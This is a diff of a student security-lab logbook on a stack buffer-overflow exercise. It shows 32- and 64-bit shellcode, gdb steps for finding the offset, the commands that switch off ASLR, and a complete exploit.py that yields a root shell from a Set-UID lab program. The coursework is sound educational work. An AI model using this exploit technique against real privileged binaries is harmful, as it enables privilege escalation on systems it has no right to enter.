@@ -5,7 +5,7 @@
 
 ### Initial setup
 
-Before starting the lab we disabled all countermeasures on Ubuntu:
+Before starting the lab, we disabled all countermeasures on Ubuntu:
 
 * `sudo sysctl -w kernel.randomize_va_space=0` to disable address space randomization (otherwise, we would need to guess the exact addresses).
 * `sudo ln -sf /bin/zsh /bin/sh` as in previous labs, we needed to run this to enable programs executed in a Set-UID process. 
@@ -14,11 +14,11 @@ Before starting the lab we disabled all countermeasures on Ubuntu:
 
 #### Step 1 
 
-We learned from this step that *shellcode* is a piece of assembly code that launches a shell. (It cannot be used as a compiled program from C, it must be written in assembly.)
+We learned from this step that *shellcode* is a piece of assembly code that launches a shell (it cannot be used as a compiled program from C, it must be written in assembly).
 
 #### Step 2: 32-bit Shellcode
 
-Here is an example of 32-bit shellcode that invokes `execve("/bin/sh")`. Basically, it will construct all three arguments: `"/bin//sh"`, `argv` with first element `"/bin//sh"` and `0` as 3rd element.
+Here is an example of 32-bit shellcode that invokes `execve("/bin/sh")`. Basically, it will construct all three arguments: `"/bin//sh"` as the executable filepath, `argv` as the command-line arguments array, with first element `"/bin//sh"` and `0` (or `NULL`) as the second, and `0` (or `NULL`) as the environment variables array. This shellcode works for executables compiled for 32-bit computer architectures.
 
 ```asm
 ; Store the command on stack
@@ -44,7 +44,7 @@ int 0x80
 
 #### Step 3: 64-Bit Shellcode
 
-Same code as the previous, but in 64-bit.
+This code does the same as the previous, but for 64-bit programs.
 
 ```asm
 xor rdx, rdx        ; rdx = 0: execve()'s 3rd argument
@@ -62,7 +62,7 @@ syscall
 
 #### Step 4: Invoking the Shellcode
 
-In this task, we were provided with the code file called `shellcode.c`. This file already contained both shellcodes for both 32-bit or 64-bit executables, which it checks, already converted to strings. Having the shellcode as the string means that it can be inserted and manipulated as text.
+In this task, we were provided with the code file called `shellcode.c`. This file already contained both shellcodes for both 32-bit or 64-bit executables, using the most adequate according to the compilation options. Having the shellcode as a string means that it can be inserted and manipulated as text.
 
 ```c
 #include <stdlib.h>
@@ -92,18 +92,18 @@ int main(int argc, char **argv)
 After compilation and running this, we can observe that it launches a shell.
 
 <p align="center" justify="center">
-  <img src="./assets/logbook_5/task1.png"/>
+  <img src="./assets/LOGBOOK5/task1.png"/>
 </p>
 
 In the experiment, if we set the program as SetUID, it will open a shell as `root`.
 
 <p align="center" justify="center">
-  <img src="./assets/logbook_5/task1-with-SetUID.png"/>
+  <img src="./assets/LOGBOOK5/task1-with-SetUID.png"/>
 </p>
 
 ### Task 2: Understanding the Vulnerable Program
 
-We were provided with code `stack.c`, that has a buffer overflow vulnerability, when we pass 517 bytes from `badfile` to buffer in `bug()` with size `BUFSIZE`. 
+We were provided with code `stack.c`, that has a buffer overflow vulnerability, when we pass more than 100 bytes from `badfile` to the array `buffer` in `bof()`, since it has size `BUFSIZE`. 
 
 ```c
 #include <stdlib.h>
@@ -137,11 +137,11 @@ int main(int argc, char **argv)
 }
 ```
 
-To compile the program, we used the provided `Makefile` with the flags `-fno-stack-protector` and `-z execstack` to disable stack smashing detection and making the stack executable during compilation. It also executes the need commands to set the program to `Set-UID` and `admin` as the owner.
-As per the instructions in Moodle, we set L1 to 108 (100 + 8 * (our group number -> 1) = 108). 
+To compile the program, we used the provided `Makefile`, which specifies the flags `-fno-stack-protector` and `-z execstack`, to disable stack smashing detection and making the stack data executable during compilation. It also executes the needed commands to set the program to `Set-UID` and `admin` as the owner.
+As per the instructions in Moodle, we set L1 to 108 (100 + 8 * 1 = 108, since our group number is 1). 
 
 <p align="center" justify="center">
-  <img src="./assets/logbook_5/task2.png"/>
+  <img src="./assets/LOGBOOK5/task2.png"/>
 </p>
 
 ### Task 3: Launching Attack on 32-bit Program
@@ -150,99 +150,111 @@ For this task, we had to edit the file `exploit.py`, run that code to produce a 
 The overall idea would be to read the contents of the file, which causes a buffer overflow that would corrupt other memory regions (including the return address of the `bof` function). By writing shellcode to the memory and making the code return to that region, we would be able to execute the shellcode.  
 By analyzing the python file, we can see that there are 4 variables that can be changed, as depicted on the table below:
 
-| Variable | Meaning |
-|:---:|:---|
+|   Variable    | Meaning                                                                                                                                                                             |
+| :-----------: | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | **shellcode** | String of code to be used as shellcode, these would correspond to the Assembly instructions that can open a shell program. Ideally, we would like the program to execute this code. |
-| **start** | Position where the shellcode will be placed. It determines the offset from the beginning of the buffer to where the shellcode starts. |
-| **ret** | Memory address to where we would like to return after the `bof` function execution. |
-| **offset** | Memory address offset between the start of the buffer and the position that stores the return address of the function. |
+|   **start**   | Position where the shellcode will be placed. It determines the offset from the beginning of the buffer to where the shellcode starts.                                               |
+|    **ret**    | Memory address to where we would like to return after the `bof` function execution.                                                                                                 |
+|  **offset**   | Memory address offset between the start of the buffer and the position that stores the return address of the function.                                                              |
 
-To start, it is easier to test the exploit in the `stack-L1-dbg` file and execute the exploit inside the gdb. The following list will contain the steps to fill each of the varibles needed for the exploit.
+To start, it is easier to test the exploit in the `stack-L1-dbg` file and execute the exploit inside the gdb. The following list will contain the steps to fill each of the variables needed for the exploit.
 
 1. For the **shellcode** we can just paste the one showed above for 32-bit.
-2. To find the correct offset, we would need to use gdb to analyze the memory addresses of the program.  
-    * We started by launching GDB with `gdb stack-L1-dbg` and setting a breakpoint at the bof function using `b bof`. Then, run the program (`run`) and step into the function (`next`).
-    * First, we need to get the address of the `$ebp` register (`p $ebp`), which contains `0xffffcb38`.
+2. To find the correct offset, we would need to use gdb to analyze the memory addresses of the program
+    * We started by launching GDB with `gdb $PWD/stack-L1-dbg` and setting a breakpoint at the bof function using `b bof`. Then, run the program (`run`) and step into the function (`next`).
+    * Thinking already on applying the exploit on the primary executable, since the memory addresses will not be the same, we have two alternatives:
+      - We can fill multiple spaces with the ret address needed, therefore increasing the chances for to execute the exploit
+      - We can change the execution inside gdb to make sure everything the stack mimics the program execution outside of it.
+      To make the exploit work with both the debug and non-debug version, we used the latter one. This way, we executed the following commands in `gdb`:
+
+      ```bash
+      $ <PWD>/stack-L1-dbg # this is how we are going to execute the command
+
+      $ gdb <PWD>/stack-L1-dbg 
+      # at the start of the gdb program, we need to set/unset these variables
+      (gdb) set env _=<PWD>/stack-L1-dbg
+      (gdb) unset env LINES
+      (gdb) unset env COLUMNS
+      ```
+
+    * First, we need to get the address of the `$ebp` register (`p $ebp`), which contains `0xffffcaf8`.
     * Then, we find the memory address of the buffer which was just defined (`p &buffer`).  
-    * By subtracting both of them, we are getting the offset corresponding to the function arguments and locally defined variables. In this case, it equals 116, so, the address in which we want to write is the one right after that, therefore, the offset is 116 + 4 (because of 32-bit) = **120**.
+    * By subtracting both of them, we are getting the offset corresponding to the function arguments and locally defined variables. In this case, it equals 116, so, the address in which we want to write is the one right after that, therefore, the offset is 116 + 4 (because of 32-bit programs using 4 byte-long addresses) = **120**.
+
 <p align="center" justify="center">
-  <img src="./assets/logbook_5/task3.png"/>
+  <img src="./assets/LOGBOOK5/task3.png"/>
 </p>
 
   > Note: the 116 interval can also be explained by the 8 space address for the argument of the function and the following 108 for the buffer just created.
-3. The start value can be set in two ranges: from 0 to 116 - len(shellcode) or from 124 to 517 - len(shellcode). In this case, we choose start as 0. 
-4. Therefore, the ret value should be set to an address below (will point to NOP, eventually skipping and reaching the desired address) or equal to the start value, which is 0 correspond to buffer address (in this case: 0xffffcac4).
+1. The start can be placed anywhere in the buffer, as long as it does not overwrite other information essential to execution, like the return address. In this case, we choose to place the shellcode at the end of the buffer, to take advantage of filling the rest of the buffer with NOP's (this makes the solution more flexible to address variations, which will be useful for exploiting the non-debug program). 
+2. Therefore, the ret value should be set to an address below (which will point to the NOP's, eventually skipping and reaching the desired address) or equal to the address where the shellcode starts, as long as it's above the address pointed by `$ebp`. Since there may be some more stack data after `$ebp`, we set it to a value much higher than `$ebp` (but still before the shellcode address).
 
 So the final version of `exploit.py` would be:
 ```py
 #!/usr/bin/python3
 import sys
 
+# Replace the content with the actual shellcode
 shellcode= (
   "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
   "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
   "\xd2\x31\xc0\xb0\x0b\xcd\x80"
 ).encode('latin-1')
 
+# Fill the content with NOP's
 content = bytearray(0x90 for i in range(517))
 
-start = 0
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 517 - len(shellcode)               # Change this number 
 content[start:start + len(shellcode)] = shellcode
 
-ret    = 0xffffca64
-offset = 120
+# Decide the return address value 
+# and put it somewhere in the payload
+ebp    = 0xffffcaf8
+ret    = ebp + 100    # Change this number 
+offset = 120          # Change this number 
 
 L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
-content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
+content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
+##################################################################
 
+# Write the content to a file
 with open('badfile', 'wb') as f:
   f.write(content)
+
 ```
 
-After running this code with `python3 exploit.py`, the badfile will be generated and the exploit should be working if we execute it inside gdb, as shown below:
+After running this code with `python3 exploit.py`, the badfile will be generated and the exploit should be working if we execute the debug program,
+Because of the considerations we took regarding the addresses, our exploit ends up being flexible enough to be applied successfully on the original program, granting a shell with root privileges, as shown below:
+
 <p align="center" justify="center">
-  <img src="./assets/logbook_5/task3-l1.png"/>
+  <img src="./assets/LOGBOOK5/task3-1.png"/>
 </p>
-
-After successfully executing the attack in gdb, we can try to change the values to perform the exploit for the `stack-L1` file itself. The only difference we need to take into account is the ret address itself, as it will be a little different. There are two main methods to apply the exploit:
-
-- We can fill multiple spaces with the ret address needed, therefore increasing the chances for to execute the exploit
-- We can change the execution inside gdb to make sure everything the stack mimics the program execution outside of it.
-
-We used the latter one. The commands needed to run this are the following:
-``` bash
-$ <PWD>/stack-L1-dbg # this is how we are going to execute the command
-
-$ gdb <PWD>/stack-L1-dbg 
-# at the start of the gdb program, we need to set/unset these variables
-(gdb) set env _=<PWD>/stack-L1-dbg
-(gdb) unset env LINES
-(gdb) unset env COLUMNS
-```
-
-After this, we can just continue performing the same steps we did before to find the initial buffer address. By changing the ret address of the `exploit.py`, running the script to generate the badfile and then executing `<PWD>/stack-L1` we will open a new shell that will be running as root (since the program is a set-UID program).
 
 # Question 2
 
 After generating the badfile and executing the attack, we can use the gdb tool to analyze the memory region affected.
 
-* First, we started GDB using the command `gdb stack-L1-dbg`
-* Second, A breakpoint was set at the line with return statement of function `bof()`, where the buffer overflow occured, using the command `b 22`.
-* Then, execute the program by typing `run`.
+* Firstly, we started GDB using the command `gdb $PWD/stack-L1-dbg`
+* Secondly, we normalize the environment variables using the `set` and `unset` commands.
+* Then, a breakpoint was set at the line with return statement of function `bof()`, where the buffer overflow occurred, using the command `b 22`.
+* Finally, we execute the program by typing `run`.
 
 <p align="center" justify="center">
-  <img src="./assets/logbook_5/step3.2-init.png"/>
+  <img src="./assets/LOGBOOK5/task-3.2-init.png"/>
 </p>
 
 * Finaly, by entering `x/517c &buffer` we see contents of the buffer:
 
 <p align="center" justify="center">
-  <img src="./assets/logbook_5/task3.2.png"/>
+  <img src="./assets/LOGBOOK5/task-3.2-1.png"/>
+  <img src="./assets/LOGBOOK5/task-3.2-2.png"/>
 </p>
 
 The above image shows the relevant bytes of the buffer addresses in memory. We can conclude 3 different things that match what we expected from the previous tasks:
 
 - The memory region is **filled with `nop` (0x90)**. More specifically, `nop` go through the "ideal" buffer limit and overflow into other regions of memory, corrupting the data that was there.
-- Highlighted with **red**, we can see the **initial buffer addresses contain the shellcode** which we injected at the start of the buffer. These are the instructions that will be executed after we return from the function.
-- Highlighted in **blue**, we can see the **return address which was overwritten with the buffer overflow** in order to return to the desired memory location. In this case, it points to the start of the buffer, making it so that the shellcode is the next piece of code to be executed.
+- Highlighted with **red**, we can see the **initial buffer addresses contain the shellcode** which we injected at the end of the buffer. These are the instructions that will be executed after we return from the function.
+- Highlighted in **blue**, we can see the **return address which was overwritten with the buffer overflow**, replacing the return address, in order to return to the desired memory location. In this case, it points to 100 bytes after `$edp`, making it so that the shellcode is the next piece of code to be executed.
 
